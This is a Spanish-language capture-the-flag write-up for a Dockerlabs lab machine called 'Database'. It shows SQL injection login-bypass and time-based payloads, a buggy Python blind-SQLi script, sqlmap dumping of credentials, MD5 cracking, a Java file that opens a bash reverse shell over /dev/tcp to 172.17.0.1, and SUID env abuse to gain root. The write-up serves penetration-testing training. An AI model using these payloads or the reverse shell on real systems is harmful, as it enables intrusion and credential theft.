
# Writeup Template: Maquina `[ Database ]`

- Tags: #Database #java #javaShell
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Database](https://mega.nz/file/JaFAhBDB#4nFyDl36xA7hyVpo8hdJSuiIh34IwjhTGG2yGtk1FLs)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x database.zip
sudo bash auto_deploy.sh database.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.52 ((UbuntuJammy))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```
---
## Enumeracion de [Servicio SAMBA]
Enumeramos el servicio para detectar posibles usuarios y recursos compartidos
```bash
enum4linux -a 172.17.0.2
```

Tenemos un usuario filtrado:
```bash
 ========================================( Users on 172.17.0.2 )========================================
index: 0x1 RID: 0x3e9 acb: 0x00000010 Account: dylan    Name: dylan     Desc: 

user:[dylan] rid:[0x3e9]
```

Tenemos el recurso compartido **shared**
```bash
==================================( Share Enumeration on 172.17.0.2 )==================================
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      
        IPC$            IPC       IPC Service (3c10b14962a5 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A
//172.17.0.2/shared     Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*    
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
```

Realizando un ataque de fuerza bruta no obtuvimos nada:
```bash
crackmapexec smb 172.17.0.2 -u dylan -p /usr/share/wordlists/rockyou.txt
```

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,pl,html
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 2921]
/.php                 (Status: 403) [Size: 275]
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos un panel de login el cual vamos a auditar si es vulnerable a alguna inyeccion para ganar accesso
```bash
http://172.17.0.2/index.php
```
### Ejecucion del Ataque
Tenemos este panel que es vulnerable a **SQLInjection** ya que hemos logrado romper la **query** del panel de inicio de sesion
```bash
# Comandos para explotación
admin'
```

Con esta query logramos ganar acceso al panel del usuario **dylan**
```bash
admin' or 1=1-- -
```

Ahora estamos en la siguiente ruta:
```bash
http://172.17.0.2/acceso_valido_dylan.php
```

Ahora probaremos si el archivo **php** es vulnerable a un **LFI** con el siguiente comado, pero no encontramos nada:
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Cookie: PHPSESSID=ufsg0br0lj7f6ug5encnmsds3q" -u "http://172.17.0.2/acceso_valido_dylan.php?=FUZZ" --hw=119
```

## Dumpeando Base de Datos `SQLInjection Time-Based`
Asi que como tenemos que el error en caso de que tengamos mal el inicio de sesion nos reporta asi que nos aprovecharemos de esto para intentar dumpear la base de datos.
Ahora que sabemos que el panel de inicio de sesion es vulnerable a inyeccin basada en tiempo:
```bash
admin' or sleep(5)-- -
```

##### Python Script:
Crearemos un script en **python** para dumpear la base de datos pero primero tenemos que sacar el nombre y la longitud de la base de datos
Hemos determinado que la primer letra de la base de datos es: **( r )**
```bash
admin' or IF(SUBSTRING(DATABASE(),1,1)='r', SLEEP(5), 0)-- -
```

Ahora determinaremos la longitud de la base de datos:
Hemos determinado que es de: **( 8 )**
```bash
' OR IF(LENGTH(DATABASE())=8, SLEEP(5), 0)-- -
```

Ahora con esta informacion podemos empezar con la construccion de nuestro script:
**Nota** Nuestro script por alguna razon no logro encontrar del todo la informacion:
```python
#!/usr/bin/env python3

import time 
import requests
import signal
import sys
import string
from termcolor import colored as c 

# Forzamos la salida:
def ctrl_c(sig, frame):
    print(c(f"\n\n[-] Saliendo...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Variables globales:
main_url = "http://172.17.0.2/index.php"
characters = string.ascii_lowercase + string.digits + "_"

def makeSQLI():
    extracted_name_db = "" # Aqui almacenamos el nombre de la base de datos
    max_length = 20 # Longitud a probar

    print(c(f"\n[*] Iniciando inyeccion...\n", "cyan"))

    for position in range(1, max_length + 1):
        char_found = False

        for character in characters:
            time_start = time.time()

            payload = f"admin' or IF(SUBSTRING(DATABASE(),{},1)='{}', SLEEP(0.35), 0)-- -".format(position, character)
            r = requests.post(main_url, data={"username": payload, "password": "natepaga"})

            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_name_db += character
                break

            # Formateamos el resultado final:
    name_db = c(f"{extracted_name_db}", "cyan")
    print(c(f"[+] Nombre de la base de datos: {name_db}", "blue"))

def main():
    makeSQLI() # Llamamos a la funcin que realiza la inyeccion

# Flujo principal del programa:
if __name__ == '__main__':
    main()
```

### Uso SQLMap:
Usaremos esta herramienta para obtener la informacion completa:
Databes: **register**
```bash
sqlmap -u http://172.17.0.2/index.php --dbs --form --batch
```

tabla: **users**
```bash
sqlmap -u http://172.17.0.2/index.php --form -D register --tables --batch
```

dumpeamos:
```bash
sqlmap -u http://172.17.0.2/index.php --form -D register -T users --dump --batch
```

Tenemos credenciales valida:
```bash
+------------------+----------+
| passwd           | username |
+------------------+----------+
| KJSDFG789FGSDF78 | dylan    |
+------------------+----------+
```

Ahora que tenemos las credenciales nos intentamos conectar al servico **SMB**
```bash
smbclient //172.17.0.2/shared -U "dylan" --password="KJSDFG789FGSDF78"
```

Logramos el acceso ahora tendremos que enumerar este servicio y si esta conectando con la aplicacion web podemos subir un archivo malicioso que nos permita ganar acceso al objetivo:
Tenemso un archivo: **augustus.txt** que descargaremos para ver su contenido:
```bash
get augustus.txt
```

Una ves descargado vemos su contenido:
```bash
cat augustus.txt

061fba5bdfc076bb7362616668de87c8
```

Determinamos el tipo de hash
```bash
hashid 061fba5bdfc076bb7362616668de87c8
Analyzing '061fba5bdfc076bb7362616668de87c8'
[+] MD2 
[+] MD5 
```

Tenemos un **HashMD5** asi que en la sigueite pagina crackeamos el hash: [MD5Decryption](https://www.md5online.org/md5-decrypt.html#google_vignette) y obtenemos en texto plano:
```bash
lovely
```

Ahora nos conectamos como el usuario: **augustus**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh augustus@172.17.0.2 # ( lovely )
```

---
## Escalada de Privilegios

###### Usuario `[ augustus ]`:
Listanod los permisos de este usuario:
```bash
sudo -l

User augustus may run the following commands on 57d2ad8c50ce:
    (dylan) /usr/bin/java # Tenemos una via potencial de escalar a este usuario
```

Ahora necesitamos crear un archivo malicioso en el directorio: **( /tmp )** con la siguiente estructura y el nombre: **( shell.java )**
```java
public class Shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/443 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

Ahora nos ponemos en escucha:
```bash
nc -nlvp 443
```

Ejecutamos la **shell** para ganar aceso como este usuario:
```bash
# Comando para escalar al usuario: ( dylan )
sudo -u dylan /usr/bin/java /tmp/shell.java
```

###### Usuario `[ augustus ]`:
Listando los permisos para este usuario:
```bash
find / -perm -4000 -ls 2>/dev/null
```

Tenemos este binario:
```bash
5761950     44 -rwsr-xr-x   1 root     root          43976 Jan  8  2024 /usr/bin/env
```

Explotando el binario:
```bash
# comando para escalar al usuario privilegiado: ( root )
/usr/bin/env /bin/bash -p
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.1# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a crear un script en python3 para automatizar una inyeccion sql
2. Aprendimos a usar **SQLMap** para automatizar toda la inyeccion
3. Aprendimos a romper un **hashMD5** para obtener la contrasena del usuario.
4. Aprendimos a explotar el bianrio **env** para ganar acceso como **root**

## Recomendaciones de Seguridad
- Validar las **querys** para evitar **SQLInjection**
- NO dar privilegios **SUID** a bianrios criticos del sistema.